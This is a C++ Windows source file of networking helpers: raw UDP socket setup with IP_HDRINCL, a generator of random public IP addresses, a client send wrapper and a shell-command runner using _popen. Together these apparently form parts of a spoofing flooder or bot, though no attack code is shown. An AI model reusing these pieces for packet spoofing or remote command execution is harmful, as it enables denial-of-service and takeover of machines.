#include "stdafx.h"

#include "winsock2.h"
#include "ws2tcpip.h" //IP_HDRINCL is here

#include <string>

#pragma comment(lib,"ws2_32.lib") //winsock 2.2 library

#include "core.h"


/* Print messages */
void Output(char *pBuf)
{
	/*FILE *pFile = fopen("Sniffer.txt","a+");
	fprintf(pFile,"%s", pBuf);
	fclose(pFile);*/
	printf("%s", pBuf);
}

/* Create winsock socket */
bool Create(SOCKET *pSock)
{
	WSADATA data;
	char aBuf[1024];

	if (WSAStartup(MAKEWORD(2, 2), &data))
	{
		sprintf_s(aBuf, sizeof(aBuf), "WSAStartup() failed: %d\n", GetLastError());
		Output(aBuf);
		return false;
	}

	*pSock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_UDP, NULL, 0, 0);

	if (*pSock == INVALID_SOCKET)
	{
		sprintf_s(aBuf, sizeof(aBuf), "WSASocket() failed: %d\n", WSAGetLastError());
		Output(aBuf);
		return false;
	}

	BOOL optvalue = TRUE;

	if (setsockopt(*pSock, IPPROTO_IP, IP_HDRINCL, (char *)&optvalue, sizeof(optvalue)) == SOCKET_ERROR)
	{
		sprintf_s(aBuf, sizeof(aBuf), "setsockopt(IP_HDRINCL) failed: %d\n", WSAGetLastError());
		Output(aBuf);
		return false;
	}

	//sprintf_s(aBuf, sizeof(aBuf), "socket created correctly\n");
	//Output(aBuf);

	return true;
}

/* Close the socket */
void Close(SOCKET sock)
{
	closesocket(sock);
	WSACleanup();
}

/* Communication with clients */
void send(SOCKET s, char *text)
{
	send(s, text, strlen(text), 0);
}


/* Generate random IP */
const char *GenerateIP()
{
	int Oktett[4];
	static char aIP[32];

	// do the initial random process
	Oktett[0] = rand() % 255 + 1;
	Oktett[1] = rand() % 255 + 1;
	Oktett[2] = rand() % 255 + 1;
	Oktett[3] = rand() % 255 + 1;

	// check for invalid IPs
	while (Oktett[0] == 192 || Oktett[0] == 10 || Oktett[0] == 172 || Oktett[0] == 127)
	{
		Oktett[0] = rand() % 255 + 1;
	}

	sprintf_s(aIP, sizeof(aIP), "%i.%i.%i.%i", Oktett[0], Oktett[1], Oktett[2], Oktett[3]);

	return aIP;
}

void exec(char* cmd) 
{
	FILE* pipe = _popen(cmd, "r");
	if (!pipe) return;
	char buffer[128];
	std::string result = "";
	while (!feof(pipe)) {
		if (fgets(buffer, 128, pipe) != NULL)
			result += buffer;
	}
	_pclose(pipe);
}
